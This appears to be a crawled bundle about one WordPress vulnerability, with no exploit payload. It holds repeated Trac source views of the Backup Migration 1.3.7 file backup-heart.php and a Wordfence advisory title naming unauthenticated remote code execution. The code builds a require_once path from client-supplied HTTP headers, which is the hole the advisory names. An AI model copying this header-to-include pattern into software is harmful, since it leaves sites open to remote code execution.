| [76](#L76) | @ini\_set('memory\_limit', (BMI\_SAFELIMIT \* 4 + 16) . 'M'); |
| [77](#L77) | @ini\_set('max\_input\_time', '259200'); |
| [78](#L78) | @ini\_set('max\_execution\_time', '259200'); |
| [79](#L79) | @ini\_set('session.gc\_maxlifetime', '1200'); |
| [80](#L80) | } |
| [81](#L81) |  |
| [82](#L82) | // Let the server know it's server-side script |
| [83](#L83) | if (isFunctionEnabled('ignore\_user\_abort')) { |
| [84](#L84) | @ignore\_user\_abort(true); |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | if (!isset($fields['content-browser'])) $fields['content-browser'] = false; |
| [88](#L88) | if (!($fields['content-browser'] === 'true' || $fields['content-browser'] === true)) { |
| [89](#L89) |  |
| [90](#L90) | // Also return something, so it can close the connection |
| [91](#L91) | ob\_start(); |
| [92](#L92) |  |
| [93](#L93) | // The message |
| [94](#L94) | echo 'This is server side script, you will not get any response here.'; |
| [95](#L95) |  |
| [96](#L96) | // Don't block server handler |
| [97](#L97) | if (isFunctionEnabled('session\_write\_close')) { |
| [98](#L98) | @session\_write\_close(); |
| [99](#L99) | } |
| [100](#L100) |  |
| [101](#L101) | // Set proper headers |
| [102](#L102) | header('Content-Length: ' . ob\_get\_length()); |
| [103](#L103) | header('Connection: close'); |
| [104](#L104) |  |
| [105](#L105) | // End the output for user |
| [106](#L106) | ob\_end\_clean(); |
| [107](#L107) | flush(); |
| [108](#L108) |  |
| [109](#L109) | } |
| [110](#L110) |  |
| [111](#L111) | // Start output for server |
| [112](#L112) | ob\_start(); |
| [113](#L113) |  |
| [114](#L114) | // Catch anything if possible |
| [115](#L115) | try { |
| [116](#L116) |  |
| [117](#L117) | // Load bypasser |
| [118](#L118) | require\_once BMI\_INCLUDES . '/bypasser.php'; |
| [119](#L119) | $request = new BMI\_Backup\_Heart(true, |
| [120](#L120) | $fields['content-configdir'], |
| [121](#L121) | $fields['content-content'], |
| [122](#L122) | $fields['content-backups'], |
| [123](#L123) | $fields['content-abs'], |
| [124](#L124) | $fields['content-dir'], |
| [125](#L125) | $fields['content-url'], |
| [126](#L126) | [ |
| [127](#L127) | 'identy' => $fields['content-identy'], |
| [128](#L128) | 'manifest' => $fields['content-manifest'], |
| [129](#L129) | 'safelimit' => $fields['content-safelimit'], |
| [130](#L130) | 'rev' => $fields['content-rev'], |
| [131](#L131) | 'backupname' => $fields['content-name'], |
| [132](#L132) | 'start' => $fields['content-start'], |
| [133](#L133) | 'filessofar' => $fields['content-filessofar'], |
| [134](#L134) | 'total\_files' => $fields['content-total'], |
| [135](#L135) | 'browser' => $fields['content-browser'], |
| [136](#L136) | 'bmitmp' => $fields['content-bmitmp'] |
| [137](#L137) | ], |
| [138](#L138) | $fields['content-it'], |
| [139](#L139) | $fields['content-dbit'], |
| [140](#L140) | $fields['content-dblast'] |
| [141](#L141) | ); |
| [142](#L142) |  |
| [143](#L143) | // Handle request |
| [144](#L144) | $request->handle\_batch(); |
| [145](#L145) |  |
| [146](#L146) | } catch (\Exception $e) { |
| [147](#L147) |  |
| [148](#L148) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [149](#L149) | error\_log(strval($e)); |
| [150](#L150) |  |
| [151](#L151) | } catch (\Throwable $e) { |
| [152](#L152) |  |
| [153](#L153) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [154](#L154) | error\_log(strval($e)); |
| [155](#L155) |  |
| [156](#L156) | } |
| [157](#L157) |  |
| [158](#L158) | // End the server task |
| [159](#L159) | ob\_end\_clean(); exit; |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?format=txt)
* [Original Format](/export/3222480/backup-backup/tags/1.3.7/includes/backup-heart.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_274f8c0e_20250114_212952.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fbackup-backup%2Ftags%2F1.3.7%2Fincludes%2Fbackup-heart.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Blame](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/backup-backup/tags/1.3.7/includes/backup-heart.php)

---

# [source:](/browser?order=name "Go to repository root") [backup-backup](/browser/backup-backup?order=name "View backup-backup")/[tags](/browser/backup-backup/tags?order=name "View tags")/[1.3.7](/browser/backup-backup/tags/1.3.7?order=name "View 1.3.7")/[includes](/browser/backup-backup/tags/1.3.7/includes?order=name "View includes")/[backup-heart.php](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?order=name "View backup-heart.php")

View diff against:

View revision:

| [Last change](/changeset/3003840/backup-backup/tags/1.3.7/includes/backup-heart.php "View differences") on this file was [3003840](/changeset/3003840/ "View changeset 3003840"), checked in by iclyde, [14 months ago](/timeline?from=2023-11-30T15%3A13%3A33Z&precision=second "See timeline at 11/30/2023 03:13:33 PM") |
| --- |
| Version 1.3.7 |
| **File size:** 4.5 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) |  |
| [3](#L3) | // Namespace |
| [4](#L4) | namespace BMI\Plugin\Heart; |
| [5](#L5) |  |
| [6](#L6) | // Allow only POST requests |
| [7](#L7) | if ($\_SERVER['REQUEST\_METHOD'] !== 'POST') { |
| [8](#L8) | exit; |
| [9](#L9) | } |
| [10](#L10) |  |
| [11](#L11) | function isFunctionEnabled($func) { |
| [12](#L12) | $disabled = explode(',', ini\_get('disable\_functions')); |
| [13](#L13) | $isDisabled = in\_array($func, $disabled); |
| [14](#L14) | if (!$isDisabled && function\_exists($func)) return true; |
| [15](#L15) | else return false; |
| [16](#L16) | } |
| [17](#L17) |  |
| [18](#L18) | // Make sure getallheaders will work |
| [19](#L19) | if (!function\_exists('\_\_getallheaders')) { |
| [20](#L20) | function \_\_getallheaders() { |
| [21](#L21) | $headers = []; |
| [22](#L22) | foreach ($\_SERVER as $name => $value) { |
| [23](#L23) | if (substr($name, 0, 5) == 'HTTP\_') { |
| [24](#L24) | $headers[str\_replace(' ', '-', ucwords(strtolower(str\_replace('\_', ' ', substr($name, 5)))))] = $value; |
| [25](#L25) | } |
| [26](#L26) | } |
| [27](#L27) | return $headers; |
| [28](#L28) | } |
| [29](#L29) | } |
| [30](#L30) |  |
| [31](#L31) | // Get fields from header |
| [32](#L32) | if (isFunctionEnabled('getallheaders')) { |
| [33](#L33) | $fields = getallheaders(); |
| [34](#L34) | } |
| [35](#L35) |  |
| [36](#L36) | // Check headers |
| [37](#L37) | if (!isset($fields['Content-Content']) && !isset($fields['content-content'])) { |
| [38](#L38) | $fields = \_\_getallheaders(); |
| [39](#L39) | } |
| [40](#L40) |  |
| [41](#L41) | // Lowercase |
| [42](#L42) | foreach ($fields as $key => $value) { |
| [43](#L43) | $buffer = $value; |
| [44](#L44) | unset($fields[$key]); |
| [45](#L45) | $fields[strtolower($key)] = $value; |
| [46](#L46) | } |
| [47](#L47) |  |
| [48](#L48) | // Let other files know that it's CURL request |
| [49](#L49) | define('BMI\_CURL\_REQUEST', true); |
| [50](#L50) | define('BMI\_CLI\_REQUEST', false); |
| [51](#L51) |  |
| [52](#L52) | // Load some constants |
| [53](#L53) | define('ABSPATH', $fields['content-abs']); |
| [54](#L54) | if (substr($fields['content-content'], -1) != '/') { |
| [55](#L55) | $fields['content-content'] = $fields['content-content'] . '/'; |
| [56](#L56) | } |
| [57](#L57) | if (!defined('WP\_CONTENT\_DIR')) { |
| [58](#L58) | define('WP\_CONTENT\_DIR', $fields['content-content']); |
| [59](#L59) | } |
| [60](#L60) | define('BMI\_CONFIG\_DIR', $fields['content-configdir']); |
| [61](#L61) | define('BMI\_BACKUPS', $fields['content-backups']); |
| [62](#L62) | define('BMI\_ROOT\_DIR', $fields['content-dir']); |
| [63](#L63) | // define('BMI\_SHARE\_LOGS\_ALLOWED', $fields['content-shareallowed']); |
| [64](#L64) | define('BMI\_INCLUDES', BMI\_ROOT\_DIR . 'includes'); |
| [65](#L65) | define('BMI\_SAFELIMIT', intval($fields['content-safelimit'])); |
| [66](#L66) |  |
| [67](#L67) | // Replace error-log file |
| [68](#L68) | if (isFunctionEnabled('ini\_set')) { |
| [69](#L69) | @ini\_set('log\_errors', 1); |
| [70](#L70) | @ini\_set('error\_log', BMI\_CONFIG\_DIR . '/background-errors.log'); |
| [71](#L71) | } |
| [72](#L72) |  |
| [73](#L73) | // Increase max execution time |
| [74](#L74) | if (isFunctionEnabled('set\_time\_limit')) @set\_time\_limit(259200); |
| [75](#L75) | if (isFunctionEnabled('ini\_set')) { |
| [76](#L76) | @ini\_set('memory\_limit', (BMI\_SAFELIMIT \* 4 + 16) . 'M'); |
| [77](#L77) | @ini\_set('max\_input\_time', '259200'); |
| [78](#L78) | @ini\_set('max\_execution\_time', '259200'); |
| [79](#L79) | @ini\_set('session.gc\_maxlifetime', '1200'); |
| [80](#L80) | } |
| [81](#L81) |  |
| [82](#L82) | // Let the server know it's server-side script |
| [83](#L83) | if (isFunctionEnabled('ignore\_user\_abort')) { |
| [84](#L84) | @ignore\_user\_abort(true); |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | if (!isset($fields['content-browser'])) $fields['content-browser'] = false; |
| [88](#L88) | if (!($fields['content-browser'] === 'true' || $fields['content-browser'] === true)) { |
| [89](#L89) |  |
| [90](#L90) | // Also return something, so it can close the connection |
| [91](#L91) | ob\_start(); |
| [92](#L92) |  |
| [93](#L93) | // The message |
| [94](#L94) | echo 'This is server side script, you will not get any response here.'; |
| [95](#L95) |  |
| [96](#L96) | // Don't block server handler |
| [97](#L97) | if (isFunctionEnabled('session\_write\_close')) { |
| [98](#L98) | @session\_write\_close(); |
| [99](#L99) | } |
| [100](#L100) |  |
| [101](#L101) | // Set proper headers |
| [102](#L102) | header('Content-Length: ' . ob\_get\_length()); |
| [103](#L103) | header('Connection: close'); |
| [104](#L104) |  |
| [105](#L105) | // End the output for user |
| [106](#L106) | ob\_end\_clean(); |
| [107](#L107) | flush(); |
| [108](#L108) |  |
| [109](#L109) | } |
| [110](#L110) |  |
| [111](#L111) | // Start output for server |
| [112](#L112) | ob\_start(); |
| [113](#L113) |  |
| [114](#L114) | // Catch anything if possible |
| [115](#L115) | try { |
| [116](#L116) |  |
| [117](#L117) | // Load bypasser |
| [118](#L118) | require\_once BMI\_INCLUDES . '/bypasser.php'; |
| [119](#L119) | $request = new BMI\_Backup\_Heart(true, |
| [120](#L120) | $fields['content-configdir'], |
| [121](#L121) | $fields['content-content'], |
| [122](#L122) | $fields['content-backups'], |
| [123](#L123) | $fields['content-abs'], |
| [124](#L124) | $fields['content-dir'], |
| [125](#L125) | $fields['content-url'], |
| [126](#L126) | [ |
| [127](#L127) | 'identy' => $fields['content-identy'], |
| [128](#L128) | 'manifest' => $fields['content-manifest'], |
| [129](#L129) | 'safelimit' => $fields['content-safelimit'], |
| [130](#L130) | 'rev' => $fields['content-rev'], |
| [131](#L131) | 'backupname' => $fields['content-name'], |
| [132](#L132) | 'start' => $fields['content-start'], |
| [133](#L133) | 'filessofar' => $fields['content-filessofar'], |
| [134](#L134) | 'total\_files' => $fields['content-total'], |
| [135](#L135) | 'browser' => $fields['content-browser'], |
| [136](#L136) | 'bmitmp' => $fields['content-bmitmp'] |
| [137](#L137) | ], |
| [138](#L138) | $fields['content-it'], |
| [139](#L139) | $fields['content-dbit'], |
| [140](#L140) | $fields['content-dblast'] |
| [141](#L141) | ); |
| [142](#L142) |  |
| [143](#L143) | // Handle request |
| [144](#L144) | $request->handle\_batch(); |
| [145](#L145) |  |
| [146](#L146) | } catch (\Exception $e) { |
| [147](#L147) |  |
| [148](#L148) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [149](#L149) | error\_log(strval($e)); |
| [150](#L150) |  |
| [151](#L151) | } catch (\Throwable $e) { |
| [152](#L152) |  |
| [153](#L153) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [154](#L154) | error\_log(strval($e)); |
| [155](#L155) |  |
| [156](#L156) | } |
| [157](#L157) |  |
| [158](#L158) | // End the server task |
| [159](#L159) | ob\_end\_clean(); exit; |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?format=txt)
* [Original Format](/export/3222480/backup-backup/tags/1.3.7/includes/backup-heart.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from packetstormsecurity.com_922065e0_20250114_212942.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from plugins.trac.wordpress.org_d43dae18_20250114_212955.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fbackup-backup%2Ftags%2F1.3.7%2Fincludes%2Fbackup-heart.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Blame](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/backup-backup/tags/1.3.7/includes/backup-heart.php)

---

# [source:](/browser?order=name "Go to repository root") [backup-backup](/browser/backup-backup?order=name "View backup-backup")/[tags](/browser/backup-backup/tags?order=name "View tags")/[1.3.7](/browser/backup-backup/tags/1.3.7?order=name "View 1.3.7")/[includes](/browser/backup-backup/tags/1.3.7/includes?order=name "View includes")/[backup-heart.php](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?order=name "View backup-heart.php")

View diff against:

View revision:

| [Last change](/changeset/3003840/backup-backup/tags/1.3.7/includes/backup-heart.php "View differences") on this file was [3003840](/changeset/3003840/ "View changeset 3003840"), checked in by iclyde, [14 months ago](/timeline?from=2023-11-30T15%3A13%3A33Z&precision=second "See timeline at 11/30/2023 03:13:33 PM") |
| --- |
| Version 1.3.7 |
| **File size:** 4.5 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) |  |
| [3](#L3) | // Namespace |
| [4](#L4) | namespace BMI\Plugin\Heart; |
| [5](#L5) |  |
| [6](#L6) | // Allow only POST requests |
| [7](#L7) | if ($\_SERVER['REQUEST\_METHOD'] !== 'POST') { |
| [8](#L8) | exit; |
| [9](#L9) | } |
| [10](#L10) |  |
| [11](#L11) | function isFunctionEnabled($func) { |
| [12](#L12) | $disabled = explode(',', ini\_get('disable\_functions')); |
| [13](#L13) | $isDisabled = in\_array($func, $disabled); |
| [14](#L14) | if (!$isDisabled && function\_exists($func)) return true; |
| [15](#L15) | else return false; |
| [16](#L16) | } |
| [17](#L17) |  |
| [18](#L18) | // Make sure getallheaders will work |
| [19](#L19) | if (!function\_exists('\_\_getallheaders')) { |
| [20](#L20) | function \_\_getallheaders() { |
| [21](#L21) | $headers = []; |
| [22](#L22) | foreach ($\_SERVER as $name => $value) { |
| [23](#L23) | if (substr($name, 0, 5) == 'HTTP\_') { |
| [24](#L24) | $headers[str\_replace(' ', '-', ucwords(strtolower(str\_replace('\_', ' ', substr($name, 5)))))] = $value; |
| [25](#L25) | } |
| [26](#L26) | } |
| [27](#L27) | return $headers; |
| [28](#L28) | } |
| [29](#L29) | } |
| [30](#L30) |  |
| [31](#L31) | // Get fields from header |
| [32](#L32) | if (isFunctionEnabled('getallheaders')) { |
| [33](#L33) | $fields = getallheaders(); |
| [34](#L34) | } |
| [35](#L35) |  |
| [36](#L36) | // Check headers |
| [37](#L37) | if (!isset($fields['Content-Content']) && !isset($fields['content-content'])) { |
| [38](#L38) | $fields = \_\_getallheaders(); |
| [39](#L39) | } |
| [40](#L40) |  |
| [41](#L41) | // Lowercase |
| [42](#L42) | foreach ($fields as $key => $value) { |
| [43](#L43) | $buffer = $value; |
| [44](#L44) | unset($fields[$key]); |
| [45](#L45) | $fields[strtolower($key)] = $value; |
| [46](#L46) | } |
| [47](#L47) |  |
| [48](#L48) | // Let other files know that it's CURL request |
| [49](#L49) | define('BMI\_CURL\_REQUEST', true); |
| [50](#L50) | define('BMI\_CLI\_REQUEST', false); |
| [51](#L51) |  |
| [52](#L52) | // Load some constants |
| [53](#L53) | define('ABSPATH', $fields['content-abs']); |
| [54](#L54) | if (substr($fields['content-content'], -1) != '/') { |
| [55](#L55) | $fields['content-content'] = $fields['content-content'] . '/'; |
| [56](#L56) | } |
| [57](#L57) | if (!defined('WP\_CONTENT\_DIR')) { |
| [58](#L58) | define('WP\_CONTENT\_DIR', $fields['content-content']); |
| [59](#L59) | } |
| [60](#L60) | define('BMI\_CONFIG\_DIR', $fields['content-configdir']); |
| [61](#L61) | define('BMI\_BACKUPS', $fields['content-backups']); |
| [62](#L62) | define('BMI\_ROOT\_DIR', $fields['content-dir']); |
| [63](#L63) | // define('BMI\_SHARE\_LOGS\_ALLOWED', $fields['content-shareallowed']); |
| [64](#L64) | define('BMI\_INCLUDES', BMI\_ROOT\_DIR . 'includes'); |
| [65](#L65) | define('BMI\_SAFELIMIT', intval($fields['content-safelimit'])); |
| [66](#L66) |  |
| [67](#L67) | // Replace error-log file |
| [68](#L68) | if (isFunctionEnabled('ini\_set')) { |
| [69](#L69) | @ini\_set('log\_errors', 1); |
| [70](#L70) | @ini\_set('error\_log', BMI\_CONFIG\_DIR . '/background-errors.log'); |
| [71](#L71) | } |
| [72](#L72) |  |
| [73](#L73) | // Increase max execution time |
| [74](#L74) | if (isFunctionEnabled('set\_time\_limit')) @set\_time\_limit(259200); |
| [75](#L75) | if (isFunctionEnabled('ini\_set')) { |
| [76](#L76) | @ini\_set('memory\_limit', (BMI\_SAFELIMIT \* 4 + 16) . 'M'); |
| [77](#L77) | @ini\_set('max\_input\_time', '259200'); |
| [78](#L78) | @ini\_set('max\_execution\_time', '259200'); |
| [79](#L79) | @ini\_set('session.gc\_maxlifetime', '1200'); |
| [80](#L80) | } |
| [81](#L81) |  |
| [82](#L82) | // Let the server know it's server-side script |
| [83](#L83) | if (isFunctionEnabled('ignore\_user\_abort')) { |
| [84](#L84) | @ignore\_user\_abort(true); |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | if (!isset($fields['content-browser'])) $fields['content-browser'] = false; |
| [88](#L88) | if (!($fields['content-browser'] === 'true' || $fields['content-browser'] === true)) { |
| [89](#L89) |  |
| [90](#L90) | // Also return something, so it can close the connection |
| [91](#L91) | ob\_start(); |
| [92](#L92) |  |
| [93](#L93) | // The message |
| [94](#L94) | echo 'This is server side script, you will not get any response here.'; |
| [95](#L95) |  |
| [96](#L96) | // Don't block server handler |
| [97](#L97) | if (isFunctionEnabled('session\_write\_close')) { |
| [98](#L98) | @session\_write\_close(); |
| [99](#L99) | } |
| [100](#L100) |  |
| [101](#L101) | // Set proper headers |
| [102](#L102) | header('Content-Length: ' . ob\_get\_length()); |
| [103](#L103) | header('Connection: close'); |
| [104](#L104) |  |
| [105](#L105) | // End the output for user |
| [106](#L106) | ob\_end\_clean(); |
| [107](#L107) | flush(); |
| [108](#L108) |  |
| [109](#L109) | } |
| [110](#L110) |  |
| [111](#L111) | // Start output for server |
| [112](#L112) | ob\_start(); |
| [113](#L113) |  |
| [114](#L114) | // Catch anything if possible |
| [115](#L115) | try { |
| [116](#L116) |  |
| [117](#L117) | // Load bypasser |
| [118](#L118) | require\_once BMI\_INCLUDES . '/bypasser.php'; |
| [119](#L119) | $request = new BMI\_Backup\_Heart(true, |
| [120](#L120) | $fields['content-configdir'], |
| [121](#L121) | $fields['content-content'], |
| [122](#L122) | $fields['content-backups'], |
| [123](#L123) | $fields['content-abs'], |
| [124](#L124) | $fields['content-dir'], |
| [125](#L125) | $fields['content-url'], |
| [126](#L126) | [ |
| [127](#L127) | 'identy' => $fields['content-identy'], |
| [128](#L128) | 'manifest' => $fields['content-manifest'], |
| [129](#L129) | 'safelimit' => $fields['content-safelimit'], |
| [130](#L130) | 'rev' => $fields['content-rev'], |
| [131](#L131) | 'backupname' => $fields['content-name'], |
| [132](#L132) | 'start' => $fields['content-start'], |
| [133](#L133) | 'filessofar' => $fields['content-filessofar'], |
| [134](#L134) | 'total\_files' => $fields['content-total'], |
| [135](#L135) | 'browser' => $fields['content-browser'], |
| [136](#L136) | 'bmitmp' => $fields['content-bmitmp'] |
| [137](#L137) | ], |
| [138](#L138) | $fields['content-it'], |
| [139](#L139) | $fields['content-dbit'], |
| [140](#L140) | $fields['content-dblast'] |
| [141](#L141) | ); |
| [142](#L142) |  |
| [143](#L143) | // Handle request |
| [144](#L144) | $request->handle\_batch(); |
| [145](#L145) |  |
| [146](#L146) | } catch (\Exception $e) { |
| [147](#L147) |  |
| [148](#L148) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [149](#L149) | error\_log(strval($e)); |
| [150](#L150) |  |
| [151](#L151) | } catch (\Throwable $e) { |
| [152](#L152) |  |
| [153](#L153) | error\_log('There was an error with Backup Migration plugin: ' . $e->getMessage()); |
| [154](#L154) | error\_log(strval($e)); |
| [155](#L155) |  |
| [156](#L156) | } |
| [157](#L157) |  |
| [158](#L158) | // End the server task |
| [159](#L159) | ob\_end\_clean(); exit; |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/backup-backup/tags/1.3.7/includes/backup-heart.php?format=txt)
* [Original Format](/export/3222480/backup-backup/tags/1.3.7/includes/backup-heart.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.wordfence.com_fda38df2_20250114_213000.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution

